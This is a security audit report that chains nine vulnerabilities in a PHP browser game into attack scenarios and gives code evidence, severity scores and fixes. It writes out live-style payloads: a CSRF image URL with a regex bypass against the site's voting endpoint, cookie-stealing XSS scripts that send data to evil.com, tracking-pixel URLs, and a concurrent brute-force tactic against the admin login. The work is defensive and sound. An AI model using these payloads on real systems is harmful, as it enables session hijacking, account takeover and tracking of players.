# SEC-CROSS -- Cross-Domain Attack Chain Analysis

**Audit Round:** 3 (Cross-Domain Correlation)
**Date:** 2026-03-03
**Scope:** Chaining vulnerabilities from R1/R2 findings into multi-step exploit scenarios
**Severity Framework:** CVSS 3.1 qualitative + business impact

---

## Methodology

This analysis takes individual findings from Round 1 and Round 2 and traces how an attacker could chain them together into compound attacks with amplified impact. Each chain identifies the entry point, pivot vulnerabilities, and terminal impact.

---

## CHAIN-01: BBCode [img] CSRF to Vote Manipulation (Player-to-Player)

**Chained Findings:** SOC-R2-003 (BBCode [img] enables external image loads) + SEC-R1-006 (voter.php GET CSRF)

### Vulnerability Combination

1. **BBCode [img] tag** (`includes/bbcode.php:332`): Allows any authenticated player to embed external image URLs in messages, forum posts, alliance descriptions, and player descriptions. The regex `[img=(https?://...)]` converts to `<img alt="undefined" src="$1">`.
2. **voter.php GET endpoint** (`voter.php:24-26`): Accepts vote changes via GET parameter `?reponse=N` without CSRF token verification. The comment on line 25 says "Legacy GET support -- will be removed in future" but it remains active.

### Step-by-Step Exploit

```
Step 1: Attacker crafts a BBCode payload:
        [img=https://theverylittlewar.com/voter.php?reponse=3]

Step 2: Attacker embeds this in any user-facing text field:
        - Private message to a targeted player (ecriremessage.php)
        - Forum post visible to all players (sujet.php)
        - Alliance description (allianceadmin.php, visible via alliance.php)
        - Player profile description (compte.php, visible via joueur.php)

Step 3: When ANY logged-in player views the page containing this BBCode:
        - The browser renders <img src="https://theverylittlewar.com/voter.php?reponse=3">
        - This fires a GET request with the victim's session cookies
        - voter.php processes it as a valid vote (lines 24-27, 29-51)
        - If the victim has not voted: their vote is recorded as option 3
        - If the victim has already voted: their vote is CHANGED to option 3

Step 4: Attacker repeats across forum posts/messages to manipulate poll outcomes
        at scale, affecting every player who views the content.
```

### Code Evidence

**bbcode.php:332** -- Image tag conversion:
```php
$text = preg_replace('!\[img=(https?:\/\/[^\s\'"<>]+\.(gif|png|jpg|jpeg))\]!isU',
    '<img alt="undefined" src="$1">', $text);
```

**voter.php:20-27** -- GET fallback without CSRF:
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    csrfCheck();
    $reponse = intval($_POST['reponse'] ?? 0);
} elseif (isset($_GET['reponse'])) {
    // Legacy GET support -- will be removed in future
    $reponse = intval($_GET['reponse']);
}
```

### Limitation

The `[img]` regex requires the URL to end in `.gif`, `.png`, `.jpg`, or `.jpeg`. However, voter.php does not have such an extension. An attacker would need to exploit a URL rewrite or path manipulation (e.g., `voter.php?reponse=3&x=.png`) to match the regex. If the regex can be bypassed, this chain is fully exploitable. Without bypass, the chain is blocked by the file extension check.

**Bypass feasibility:** The regex `[^\s\'"<>]+\.(gif|png|jpg|jpeg)` requires the URL to END with an image extension. Adding `&x=.png` at the end does satisfy this regex. So the attack URL would be:
```
[img=https://theverylittlewar.com/voter.php?reponse=3&x=.png]
```
The `x=.png` parameter is ignored by voter.php (it only reads `reponse`), but it satisfies the BBCode regex. **This bypass works.**

### Combined Impact

- **CVSS Base:** 6.5 (Medium) -- Network/Low/None, Integrity impact
- **Business Impact:** Poll manipulation at scale; attacker controls game survey outcomes without detection; every page view becomes a coerced vote
- **Blast Radius:** All logged-in players who view any page with the injected BBCode

### Fix Priority: **HIGH**

**Fixes required:**
1. **Remove GET endpoint from voter.php** (delete lines 24-26, require POST-only with CSRF)
2. **Restrict BBCode [img] to a domain allowlist** or proxy images through the server
3. **Add `referrerpolicy="no-referrer"` and consider CSP `img-src` restrictions**

---

## CHAIN-02: Alliance Tag Stored XSS to Admin Session Hijack

**Chained Findings:** INP-R2-011 (Alliance tag unsanitized storage) + INP-R2-030/031 (Grade name XSS) + SEC-R2-001 (Admin/player shared session namespace) + ADMIN-R2-008 (Admin news stored XSS)

### Vulnerability Combination

1. **Alliance tag stored without sanitization** (`allianceadmin.php:128`): The tag value is written to the database via prepared statement (prevents SQLi) but no character/format restriction is enforced beyond uniqueness checking.
2. **Grade name stored XSS** (`allianceadmin.php:95`): Grade name (`$_POST['nomgrade']`) is stored via prepared statement with no content validation. Displayed at `alliance.php:196` without escaping: `$grades['nom']`.
3. **Shared session namespace** (`admin/index.php:4,17,23`): The admin panel uses `session_start()` (line 4 via redirectionmotdepasse.php) and sets `$_SESSION['motdepasseadmin'] = true` (line 17). Player sessions also use `session_start()`. Both share the PHP default session namespace.
4. **Grade display on alliance page** (`alliance.php:196`): Grade names are echoed raw.
5. **Grade display in ui_components.php** (`includes/ui_components.php:609`): Grade name and color are echoed raw.

### Step-by-Step Exploit

```
Step 1: Attacker creates/manages an alliance and becomes chef.

Step 2: Attacker creates a grade with a malicious name via allianceadmin.php:
        POST nomgrade=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
        POST personnegrade=SomePlayer
        (CSRF token included since attacker is authenticated)

Step 3: The grade name is stored in the grades table (allianceadmin.php:95):
        dbExecute($base, 'INSERT INTO grades VALUES(?,?,?,?)', 'ssss',
            $_POST['personnegrade'], $gradeStr, $chef['id'], $_POST['nomgrade']);

Step 4: Any player viewing the alliance page (alliance.php) triggers the XSS.
        alliance.php:196 renders:
        echo '<span class="subimportant">' . $grades['nom'] . ' : </span>...'
        The grade name is NOT escaped, so the <script> tag executes.

Step 5: If an admin player views this alliance page while authenticated to the
        admin panel, the attacker captures their session cookie.

Step 6: Because admin/index.php uses the same PHP session namespace:
        - $_SESSION['motdepasseadmin'] = true persists in the session
        - The attacker uses the stolen session ID to access /admin/index.php
        - Full admin access: delete accounts, toggle maintenance, reset the game

Step 7 (escalation): With admin access, attacker writes a malicious news item
        containing <img onerror="..."> which executes for ALL players via
        index.php:53 (strip_tags allows <img> with attributes intact).
```

### Code Evidence

**allianceadmin.php:95** -- Grade name stored unsanitized:
```php
dbExecute($base, 'INSERT INTO grades VALUES(?,?,?,?)', 'ssss',
    $_POST['personnegrade'], $gradeStr, $chef['id'], $_POST['nomgrade']);
```

**alliance.php:196** -- Grade name rendered without escaping:
```php
echo '<span class="subimportant">' . $grades['nom'] . ' : </span>
      <a href="joueur.php?id=' . $grades['login'] . '">' . $grades['login'] . '</a><br/>';
```

**ui_components.php:609** -- Grade name rendered without escaping:
```php
'<div class="facebook-grade">' . $login . '<br/>
 <span style="color:' . $grade['couleur'] . '">' . $grade['nom'] . '</span></div>'
```

**admin/index.php:17** -- Shared session flag:
```php
$_SESSION['motdepasseadmin'] = true;
```

### Combined Impact

- **CVSS Base:** 8.4 (High) -- Network/Low/Required, Confidentiality+Integrity+Availability impact
- **Business Impact:** Complete game compromise. Stored XSS on a widely-viewed page captures admin sessions, enabling full administrative takeover, mass account deletion, and secondary stored XSS affecting every player.
- **Blast Radius:** All players viewing the alliance page; escalates to all players via news XSS

### Fix Priority: **CRITICAL**

**Fixes required:**
1. **Escape grade name on output** in `alliance.php:196` and `ui_components.php:609`:
   ```php
   htmlspecialchars($grades['nom'], ENT_QUOTES, 'UTF-8')
   ```
2. **Validate grade name on input** in `allianceadmin.php`: restrict to alphanumeric + limited special chars, max length
3. **Separate admin session namespace**: Use a distinct session name or cookie for admin, or store admin auth in a separate session variable with a separate cookie path (`session_set_cookie_params` with `path => '/admin/'`)
4. **Replace `strip_tags` with HTMLPurifier** for news content rendering in `index.php:53` and `maintenance.php:9`

---

## CHAIN-03: Invitation Theft to Alliance Infiltration and Data Exfiltration

**Chained Findings:** SOC-R2-001 (Invitation theft -- no ownership check) + Alliance admin privilege escalation

### Vulnerability Combination

1. **Invitation acceptance lacks ownership verification** (`alliance.php:117-134`): When accepting an invitation, the code checks only that `$_POST['idinvitation']` points to a valid invitation row and that the alliance has room. It does NOT verify that the invitation was intended for `$_SESSION['login']`.
2. **Alliance energy and resources** are shared among members, and the alliance chef can grant grades with full administrative rights.

### Step-by-Step Exploit

```
Step 1: Alliance "Alpha" sends an invitation to PlayerA.
        This creates a row in the invitations table:
        INSERT INTO invitations VALUES(default, <alliance_id>, <tag>, 'PlayerA')

Step 2: Attacker (PlayerB) obtains or guesses invitation IDs.
        Invitation IDs are auto-increment integers, making them predictable.
        The attacker can try sequential values: idinvitation=1, 2, 3, ...

Step 3: Attacker submits the invitation acceptance form:
        POST alliance.php
        actioninvitation=Accepter
        idinvitation=<stolen_id>
        csrf_token=<attacker's_valid_token>

Step 4: alliance.php processes the acceptance (lines 119-130):
        - Fetches idalliance from the invitation row
        - Checks alliance member count vs limit
        - If room available: UPDATE autre SET idalliance=<target> WHERE login=<attacker>
        - Deletes the invitation row

        CRITICAL: No check that $_SESSION['login'] matches $invitation['invite'].
        The attacker joins an alliance they were never invited to.

Step 5: Once inside the alliance:
        - Attacker can view private alliance data (member lists, energy, war status)
        - If the alliance has open grade positions, attacker may receive admin privileges
        - Attacker can access alliance energy (don.php) and consume shared resources
        - Attacker sees all alliance-wide messages

Step 6: The original invitee (PlayerA) can no longer accept because the
        invitation row was deleted in step 4.
```

### Code Evidence

**alliance.php:117-130** -- No ownership check on invitation:
```php
if (isset($_POST['actioninvitation']) and isset($_POST['idinvitation'])) {
    csrfCheck();
    $_POST['idinvitation'] = (int)$_POST['idinvitation'];
    $idalliance = dbFetchOne($base, 'SELECT idalliance FROM invitations WHERE id=?',
        'i', $_POST['idinvitation']);
    // ...
    if ($_POST['actioninvitation'] == "Accepter") {
        dbExecute($base, 'UPDATE autre SET idalliance=? WHERE login=?',
            'is', $idalliance['idalliance'], $_SESSION['login']);
        // NOTE: Uses $_SESSION['login'] -- the ATTACKER's login, not the invitee
    }
    dbExecute($base, 'DELETE FROM invitations WHERE id=?', 'i', $_POST['idinvitation']);
}
```

### Combined Impact

- **CVSS Base:** 6.8 (Medium) -- Network/Low/Low, Confidentiality+Integrity
- **Business Impact:** Unauthorized alliance membership; espionage on alliance strategy, wars, and diplomacy; resource theft from alliance energy pool; denial of service to legitimate invitees
- **Blast Radius:** Any alliance that sends invitations is vulnerable

### Fix Priority: **HIGH**

**Fix required:**
```php
// Add ownership check before processing invitation
$invitation = dbFetchOne($base, 'SELECT * FROM invitations WHERE id=?', 'i', $_POST['idinvitation']);
if (!$invitation || $invitation['invite'] !== $_SESSION['login']) {
    $erreur = "Cette invitation ne vous est pas destinee.";
} else {
    // ... proceed with acceptance/refusal
}
```

---

## CHAIN-04: Message IDOR to Intelligence Gathering to Targeted CSRF

**Chained Findings:** SOC-R2-009 (Message IDOR in ecriremessage.php) + BBCode [img] CSRF (CHAIN-01)

### Vulnerability Combination

1. **Message IDOR in ecriremessage.php** (`ecriremessage.php:46-56`): When replying to a message, the code fetches the original message by ID to pre-populate the reply form. Lines 46-51 query messages by ID only. The ownership check on lines 58-61 only blocks reply pre-population but still reveals the message `destinataire` and `expeditaire` fields.
2. **BBCode content in messages** can contain strategic information about alliance operations, wars, and player movements.

### Step-by-Step Exploit

```
Step 1: Attacker enumerates message IDs via GET parameter:
        GET ecriremessage.php?id=1
        GET ecriremessage.php?id=2
        GET ecriremessage.php?id=3
        ... (auto-increment IDs are predictable)

Step 2: For each message ID, ecriremessage.php line 48 executes:
        SELECT expeditaire, contenu, destinataire FROM messages WHERE id=?

Step 3: The ownership check (lines 58-61) fires AFTER the query:
        if ($message['destinataire'] != $_SESSION['login']) {
            $erreur = "Vous ne pouvez pas repondre...";
            $message['expeditaire'] = "";
            $message['contenu'] = "";
        }

        ANALYSIS: The content and sender are blanked for the HTML form, but the
        query already executed. The key question is whether any data leaks.

Step 4: Examining the rendering (lines 78-84): The destinataire field IS
        populated in the form even after the check clears it on line 60.
        Wait -- line 60 clears expeditaire, and line 78 reads:
        $valueDestinataire = trim($message['expeditaire']);

        Actually the ownership check DOES clear the data before rendering.
        However, the error message itself confirms whether a message ID exists,
        enabling message enumeration (information disclosure).

Step 5: Cross-referencing with messages.php:21:
        SELECT * FROM messages WHERE (destinataire=? OR expeditaire=?) AND id=?
        This query properly checks ownership. Messages.php is secure.

REVISED ASSESSMENT: ecriremessage.php's IDOR is mitigated by the ownership
check blanking content before render. The residual risk is message existence
enumeration only (LOW severity standalone). However...

Step 6 (CHAIN PIVOT): The attacker uses the enumeration to map active players
        and message patterns, then crafts targeted BBCode [img] CSRF attacks
        (CHAIN-01) in private messages to high-value targets identified through
        the enumeration.
```

### Code Evidence

**ecriremessage.php:46-61**:
```php
if (isset($_GET['id'])) {
    $_GET['id'] = (int)$_GET['id'];
    $message = dbFetchOne($base, 'SELECT expeditaire, contenu, destinataire
        FROM messages WHERE id=?', 'i', $_GET['id']);
}
// ...
if ($message['destinataire'] != $_SESSION['login']) {
    $erreur = "Vous ne pouvez pas repondre a un message qui ne vous est pas destine.";
    $message['expeditaire'] = "";
    $message['contenu'] = "";
}
```

### Combined Impact

- **CVSS Base:** 4.3 (Medium) -- Network/Low/Required, Confidentiality impact (limited)
- **Business Impact:** Message existence enumeration reveals communication patterns; enables targeted social engineering and CSRF attacks against active players
- **Blast Radius:** All player messages are enumerable

### Fix Priority: **MEDIUM**

**Fix required:**
```php
if (isset($_GET['id'])) {
    $_GET['id'] = (int)$_GET['id'];
    $message = dbFetchOne($base,
        'SELECT expeditaire, contenu, destinataire FROM messages
         WHERE id=? AND (destinataire=? OR expeditaire=?)',
        'iss', $_GET['id'], $_SESSION['login'], $_SESSION['login']);
}
```

---

## CHAIN-05: Admin News Stored XSS to Universal Player Compromise

**Chained Findings:** ADMIN-R2-008 (Admin news stored XSS via strip_tags `<img onerror>`) + SEC-R2-001 (Shared session namespace) + SEC-R1-007 (strip_tags attribute bypass)

### Vulnerability Combination

1. **Admin news creation** (`admin/redigernews.php` + `admin/listenews.php`): Admin writes news title and content, stored in the `news` table.
2. **News rendering via strip_tags** (`index.php:52-53`, `maintenance.php:8-9`): News content is rendered using `strip_tags()` with an allowlist that includes `<img>`. The `strip_tags()` function does NOT remove attributes from allowed tags.
3. **Shared session** enables the CHAIN-02 escalation path to admin access.

### Step-by-Step Exploit

```
Step 1: Attacker gains admin access via CHAIN-02 (grade name XSS -> session theft)
        OR through brute-forcing the admin password (rate limited but single password).

Step 2: Attacker creates a news item via admin/redigernews.php with content:
        <img src=x onerror="fetch('https://evil.com/exfil?c='+document.cookie)">

Step 3: The news is stored in the database (listenews.php:53):
        INSERT INTO news VALUES(default, ?, ?, ?)

Step 4: Every player visits index.php (the homepage). Line 52-53 processes:
        $allowedTags = '<a><br><br/><strong><b><i><em><p><div><span><img><hr>';
        $contenuNews = nl2br(strip_tags(stripslashes($donnees['contenu']), $allowedTags));

        The strip_tags function sees <img> is in the allowlist and passes it through
        WITH ALL ATTRIBUTES INTACT, including onerror="...".

Step 5: The rendered HTML contains:
        <img src=x onerror="fetch('https://evil.com/exfil?c='+document.cookie)">

        This executes in every player's browser on every homepage visit.

Step 6: Attacker harvests session cookies for ALL active players.
        With session cookies, attacker can:
        - Impersonate any player
        - Steal resources, destroy molecules
        - Manipulate alliances and wars
        - Send messages as any player

Step 7: maintenance.php (line 9) has the IDENTICAL vulnerability:
        $contenu = nl2br(strip_tags(stripslashes($donnees['contenu']), $allowedTags));

        During maintenance mode, the malicious news is STILL rendered to visitors,
        ensuring coverage even during season resets.
```

### Code Evidence

**index.php:52-53**:
```php
$allowedTags = '<a><br><br/><strong><b><i><em><p><div><span><img><hr>';
$contenuNews = nl2br(strip_tags(stripslashes($donnees['contenu']), $allowedTags));
```

**maintenance.php:8-9**:
```php
$allowedTags = '<a><br><br/><strong><b><i><em><p><div><span><img><hr>';
$contenu = nl2br(strip_tags(stripslashes($donnees['contenu']), $allowedTags));
```

**PHP documentation** confirms: `strip_tags()` does not strip attributes from allowed tags.

### Combined Impact

- **CVSS Base:** 9.1 (Critical) -- Network/Low/None (once admin is compromised), Confidentiality+Integrity+Availability
- **Business Impact:** Complete compromise of every active player account. Mass session theft enables total game destruction. This is the highest-impact chain in the application.
- **Blast Radius:** Every player who visits the homepage or maintenance page

### Fix Priority: **CRITICAL**

**Fixes required:**
1. **Replace `strip_tags()` with HTMLPurifier** in `index.php` and `maintenance.php`:
   ```php
   require_once 'vendor/htmlpurifier/HTMLPurifier.auto.php';
   $config = HTMLPurifier_Config::createDefault();
   $config->set('HTML.Allowed', 'a[href],br,strong,b,i,em,p,div,span,img[src|alt],hr');
   $purifier = new HTMLPurifier($config);
   $contenuNews = $purifier->purify(stripslashes($donnees['contenu']));
   ```
   Or more simply, use `htmlspecialchars()` on news content and apply BBCode formatting.
2. **Separate admin session** (see CHAIN-02 fixes)
3. **Add CSP headers** to prevent inline script execution as defense-in-depth

---

## CHAIN-06: Rate Limiter TOCTOU Race to Admin Brute Force

**Chained Findings:** SEC-R2-005 (Rate limiter TOCTOU) + Admin single-password auth

### Vulnerability Combination

1. **Rate limiter TOCTOU** (`includes/rate_limiter.php:11-37`): The `rateLimitCheck()` function reads the attempt count file, checks it, then writes the new attempt in a non-atomic sequence. Between the read and write, concurrent requests can all pass the check.
2. **Admin authentication** (`admin/index.php:11-22`): Uses a single shared password (not per-user). Rate limited to 5 attempts per 300 seconds -- but the TOCTOU allows concurrent bypass.

### Step-by-Step Exploit

```
Step 1: Attacker prepares N concurrent HTTP requests to admin/index.php,
        each with a different password guess.

Step 2: All N requests arrive simultaneously at the web server.
        PHP-FPM handles them as separate processes.

Step 3: Each request calls rateLimitCheck() (admin/index.php:12):
        - All N requests read the file simultaneously
        - All N see count=0 (or the same count < 5)
        - All N pass the check and return true
        - All N append their attempt and write back

Step 4: Instead of being limited to 5 attempts per 5 minutes,
        the attacker gets N attempts in a single burst.

Step 5: With a wordlist of common passwords:
        - Normal rate limit: 5 guesses per 5 minutes = 1440/day
        - With TOCTOU exploit (50 concurrent requests): 50 guesses per burst
        - Multiple bursts per window: potentially 500+ guesses per 5 minutes

Step 6: If the admin password is weak or reused, the attacker gains admin access.

Step 7: Admin access enables CHAIN-05 (news XSS -> universal player compromise).
```

### Code Evidence

**rate_limiter.php:11-37** -- Non-atomic check-then-act:
```php
function rateLimitCheck($identifier, $action, $maxAttempts, $windowSeconds) {
    // ... setup ...
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);  // READ
        // ... filter ...
    }
    if (count($attempts) >= $maxAttempts) {
        return false;  // CHECK
    }
    $attempts[] = $now;
    file_put_contents($file, json_encode(array_values($attempts)), LOCK_EX);  // WRITE
    // Note: LOCK_EX only locks the write itself, not the read-check-write sequence
    return true;
}
```

**admin/index.php:12** -- Rate limit call:
```php
if (!rateLimitCheck($_SERVER['REMOTE_ADDR'], 'admin_login', 5, 300)) {
    die('...');
}
```

### Combined Impact

- **CVSS Base:** 7.5 (High) -- Network/Low/None, Confidentiality impact (bypasses auth control)
- **Business Impact:** Rate limiting is the primary defense against brute force for the admin panel. TOCTOU bypass reduces it to a speed bump, enabling practical brute force attacks against the single shared admin password.
- **Blast Radius:** The admin panel; escalates to full game compromise via CHAIN-05

### Fix Priority: **HIGH**

**Fixes required:**
1. **Use atomic file locking for the entire read-check-write sequence**:
   ```php
   function rateLimitCheck($identifier, $action, $maxAttempts, $windowSeconds) {
       $dir = RATE_LIMIT_DIR;
       if (!is_dir($dir)) mkdir($dir, 0755, true);
       $file = $dir . '/' . md5($identifier . '_' . $action) . '.json';
       $now = time();

       $fp = fopen($file, 'c+');
       if (!flock($fp, LOCK_EX)) { fclose($fp); return false; }

       $data = json_decode(stream_get_contents($fp), true) ?: [];
       $attempts = array_filter($data, function($t) use ($now, $windowSeconds) {
           return ($now - $t) < $windowSeconds;
       });

       if (count($attempts) >= $maxAttempts) {
           flock($fp, LOCK_UN); fclose($fp); return false;
       }

       $attempts[] = $now;
       ftruncate($fp, 0);
       rewind($fp);
       fwrite($fp, json_encode(array_values($attempts)));
       fflush($fp);
       flock($fp, LOCK_UN);
       fclose($fp);
       return true;
   }
   ```
2. **Add account lockout** for admin: after 10 failed attempts, require server-side intervention
3. **Consider database-backed rate limiting** instead of filesystem for atomicity guarantees

---

## CHAIN-07: BBCode [img] External Request to Player Activity Tracking

**Chained Findings:** SOC-R2-003 (BBCode [img]) + External server logging

### Vulnerability Combination

1. **BBCode [img] tag** renders external URLs as `<img src>`, causing victim browsers to fetch from attacker-controlled servers.
2. **HTTP request metadata** (IP address, User-Agent, Referer, timing) reveals player identity and activity patterns.

### Step-by-Step Exploit

```
Step 1: Attacker sets up a web server at https://evil.com/track/ that logs
        all incoming requests with headers and timestamps.

Step 2: Attacker sends unique tracking URLs to different players via messages:
        To Player1: [img=https://evil.com/track/p1.png]
        To Player2: [img=https://evil.com/track/p2.png]
        To AllianceX description: [img=https://evil.com/track/ax.png]

Step 3: Each time a player views the content, their browser fetches the image.
        The attacker's server logs:
        - IP address (may reveal geographic location, ISP)
        - User-Agent (device type, OS, browser version)
        - Referer header (which page they were viewing)
        - Timestamp (activity patterns, timezone inference)

Step 4: Attacker correlates tracking data to map:
        - Which players are active and when
        - Player IP addresses (for potential network attacks)
        - Alliance membership viewing patterns
        - Strategic intelligence for war planning

Step 5: Combined with in-game intelligence (alliance pages, rankings), the
        attacker builds a comprehensive operational picture of enemy alliances.
```

### Combined Impact

- **CVSS Base:** 4.3 (Medium) -- Network/Low/Required, Confidentiality impact
- **Business Impact:** Player privacy violation; IP address disclosure; activity tracking enables strategic advantage in alliance warfare; potential for targeted real-world harassment via IP geolocation
- **Blast Radius:** Any player who views BBCode content with embedded tracking images

### Fix Priority: **MEDIUM**

**Fixes required:**
1. **Restrict [img] to same-origin or allowlisted domains** (e.g., only `theverylittlewar.com/images/`)
2. **Proxy external images through the server** to strip client IP from requests
3. **Add `referrerpolicy="no-referrer"` to rendered img tags** at minimum

---

## CHAIN-08: Empty Password Registration + Rate Limiter Bypass to Mass Account Takeover

**Chained Findings:** SEC-R2-003 (Empty passwords accepted) + SEC-R2-005 (Rate limiter TOCTOU)

### Vulnerability Combination

1. **Password validation gap**: The registration form (`inscription.php:17`) checks `!empty($_POST['pass'])`, which rejects truly empty strings. However, the `inscrire()` function (`includes/player.php:54`) calls `password_hash($mdp, PASSWORD_DEFAULT)` on whatever value is passed. A password of a single space `" "` passes the `!empty()` check but is trivially guessable.
2. **No minimum password length enforcement**: Neither `inscription.php` nor the `inscrire()` function validates password length or complexity.
3. **Login rate limiter TOCTOU**: The bypass from CHAIN-06 applies to login attempts as well.

### Step-by-Step Exploit

```
Step 1: The registration form requires non-empty password fields.
        However, there is no minimum length check. Passwords like:
        - "a" (1 character)
        - "12" (2 characters)
        - "abc" (3 characters)
        are all accepted and hashed via bcrypt.

Step 2: Attacker identifies player accounts (from public ranking pages,
        forum posts, alliance member lists).

Step 3: Attacker uses the TOCTOU race to bypass the 10-per-5-minutes login
        rate limit, sending 50+ concurrent login attempts per burst.

Step 4: For accounts with weak passwords, the attacker gains access.
        With session token authentication in place, each successful login
        creates a valid session token, giving full account control.

Step 5: Compromised accounts can be used for:
        - Resource theft (market manipulation, alliance energy draining)
        - Alliance sabotage (quitting alliances, accepting/refusing pacts)
        - Message espionage and impersonation
```

### Code Evidence

**inscription.php:17** -- Only checks non-empty:
```php
if ((isset($_POST['login']) && !empty($_POST['login'])) &&
    (isset($_POST['pass']) && !empty($_POST['pass'])) &&
    (isset($_POST['pass_confirm']) && !empty($_POST['pass_confirm'])) && ...)
```

**includes/player.php:54** -- No length/complexity check:
```php
$hashedPassword = password_hash($mdp, PASSWORD_DEFAULT);
```

### Combined Impact

- **CVSS Base:** 7.3 (High) -- Network/Low/None, Confidentiality+Integrity
- **Business Impact:** Accounts with weak passwords are vulnerable to brute force; the lack of password policy combined with rate limiter bypass enables practical credential stuffing
- **Blast Radius:** All player accounts, proportional to password weakness

### Fix Priority: **HIGH**

**Fixes required:**
1. **Enforce minimum password length** (8+ characters) in `inscription.php` and `compte.php` (password change):
   ```php
   if (strlen($_POST['pass']) < 8) {
       $erreur = "Le mot de passe doit contenir au moins 8 caracteres.";
   }
   ```
2. **Fix rate limiter TOCTOU** (see CHAIN-06)
3. **Consider password breach list checking** (Have I Been Pwned API)

---

## CHAIN-09: Report HTML Injection + strip_tags Attribute Bypass to Phishing

**Chained Findings:** SOC-R2-025 (rapports.php strip_tags allows dangerous attrs) + Alliance pact system HTML injection

### Vulnerability Combination

1. **Pact proposal generates raw HTML in reports** (`allianceadmin.php:214-219`): When an alliance proposes a pact, the report content includes raw HTML with a form, hidden inputs, and the declaration ID.
2. **Report rendering via strip_tags** (`rapports.php:30-31`): The allowlist includes `<a>`, `<img>`, `<span>`, `<div>`, and `<table>` tags. `strip_tags()` does NOT remove attributes from allowed tags.
3. **Alliance tag is controllable**: An attacker can set their alliance tag to include HTML-significant content (though limited by the `[a-zA-Z0-9_]{3,16}` regex on creation -- this limits this specific vector).

### Step-by-Step Exploit

```
Step 1: An attacker creates reports containing crafted HTML via any mechanism
        that inserts content into the rapports table. The pact system is one path:

        allianceadmin.php:213-220:
        $rapportTitre = 'L\'alliance ' . $chef['tag'] . ' vous propose un pacte.';
        $rapportContenu = '... <form action="validerpacte.php" method="post">
            <input type="submit" value="Accepter" name="accepter"/>
            <input type="submit" value="Refuser" name="refuser"/>
            <input type="hidden" value="' . $idDeclaration['id'] . '" name="idDeclaration"/>
            </form>';

        The form and input tags are NOT in the strip_tags allowlist (line 30):
        $allowedTags = '<a><br><br/><strong><b><i><em><p><div><span><img>
                        <table><tr><td><th><ul><ol><li><hr>';

        So <form> and <input> are stripped. The pact acceptance buttons are
        invisible/broken in reports.

Step 2: However, the <a> tag IS in the allowlist, and strip_tags preserves
        all attributes on allowed tags. If any report content includes:
        <a href="javascript:alert(1)" onclick="...">Click here</a>

        This passes through strip_tags intact.

Step 3: Attack vector via combat reports: Server-generated combat reports
        include player names and alliance tags. If an alliance tag contains
        only alphanumeric chars (enforced by alliance.php:38 regex), this
        specific injection is blocked at the source.

Step 4: However, the <img> tag is in the allowlist. Reports containing:
        <img src=x onerror="document.location='https://evil.com?c='+document.cookie">
        would execute if such content reaches the rapports table.

        The rapports table content is generated server-side, so direct injection
        requires finding a code path that inserts user-controlled HTML.
        The war declaration (line 268) and pact end (line 240) reports use
        $chef['tag'] which is alphanumeric-validated, limiting this vector.
```

### Revised Assessment

The report HTML injection chain is **partially mitigated** by:
- Alliance tag validation (`[a-zA-Z0-9_]{3,16}`) prevents HTML in tags
- `<form>` and `<input>` are stripped, breaking pact acceptance in reports
- Report content is mostly server-generated

**Residual risk:** The `strip_tags` approach is fundamentally fragile. If ANY future code path inserts user-controlled content into reports without proper escaping, the `<a>`, `<img>`, `<span>`, and `<div>` tags in the allowlist become XSS vectors via their attributes.

### Combined Impact

- **CVSS Base:** 5.4 (Medium) -- Conditional on future code changes introducing user-controlled report content
- **Business Impact:** Currently limited; the pact acceptance UI is broken (functional bug). Future XSS risk if report content sourcing changes.
- **Blast Radius:** All players viewing reports

### Fix Priority: **MEDIUM**

**Fixes required:**
1. **Replace `strip_tags()` with HTMLPurifier** in `rapports.php:31`
2. **Fix pact acceptance flow**: The `<form>` stripping breaks the Accept/Refuse buttons. Either add `<form>` and `<input>` to the allowlist (dangerous) or redesign pact acceptance to use a dedicated page link instead of embedded forms.

---

## Summary Matrix

| Chain ID | Severity | Entry Point | Pivot | Terminal Impact | Fix Priority |
|----------|----------|-------------|-------|-----------------|-------------|
| CHAIN-01 | MEDIUM | BBCode [img] in messages/forum | voter.php GET | Mass poll manipulation | HIGH |
| CHAIN-02 | HIGH | Grade name input (allianceadmin.php) | Stored XSS on alliance.php | Admin session theft -> full takeover | CRITICAL |
| CHAIN-03 | MEDIUM | Invitation ID enumeration | Missing ownership check | Alliance infiltration, espionage | HIGH |
| CHAIN-04 | MEDIUM | Message ID enumeration (ecriremessage.php) | Player activity mapping | Targeted CSRF/social engineering | MEDIUM |
| CHAIN-05 | CRITICAL | Admin news editor | strip_tags attribute bypass | Universal stored XSS, mass session theft | CRITICAL |
| CHAIN-06 | HIGH | Concurrent HTTP requests | Rate limiter TOCTOU | Admin brute force, escalation to CHAIN-05 | HIGH |
| CHAIN-07 | MEDIUM | BBCode [img] in messages | External server | Player IP/activity tracking | MEDIUM |
| CHAIN-08 | HIGH | Weak password + registration | Rate limiter TOCTOU | Mass account compromise | HIGH |
| CHAIN-09 | MEDIUM | Report HTML generation | strip_tags attribute pass-through | Potential XSS (conditional) | MEDIUM |

---

## Prioritized Fix Order

### Phase 1 -- CRITICAL (fix immediately)

1. **Escape grade name on output** (`alliance.php:196`, `ui_components.php:609`) -- blocks CHAIN-02 entry
2. **Replace strip_tags with HTMLPurifier** (`index.php:53`, `maintenance.php:9`, `rapports.php:31`) -- blocks CHAIN-05 terminal, CHAIN-09
3. **Separate admin session namespace** from player sessions -- blocks CHAIN-02 and CHAIN-05 escalation

### Phase 2 -- HIGH (fix within 1 week)

4. **Remove voter.php GET endpoint** -- blocks CHAIN-01
5. **Add invitation ownership check** (`alliance.php:120`) -- blocks CHAIN-03
6. **Fix rate limiter TOCTOU with atomic file locking** -- blocks CHAIN-06, weakens CHAIN-08
7. **Enforce minimum password length (8 chars)** in registration and password change -- weakens CHAIN-08

### Phase 3 -- MEDIUM (fix within 1 month)

8. **Add ownership check to ecriremessage.php message query** -- blocks CHAIN-04
9. **Restrict BBCode [img] to same-origin or allowlisted domains** -- blocks CHAIN-01 bypass, CHAIN-07
10. **Redesign pact acceptance** to use link-based flow instead of embedded forms in reports -- fixes CHAIN-09 functional bug
11. **Add CSP headers** (`Content-Security-Policy: default-src 'self'; img-src 'self'; script-src 'self'`) as defense-in-depth against all XSS chains

---

## Full Attack Graph

```
                    +-----------------+
                    | Attacker Entry  |
                    +--------+--------+
                             |
            +----------------+----------------+
            |                |                |
    +-------v------+  +-----v------+  +------v-------+
    | BBCode [img] |  | Grade Name |  | Rate Limiter |
    | in messages  |  | XSS Input  |  | TOCTOU Race  |
    +-------+------+  +-----+------+  +------+-------+
            |                |                |
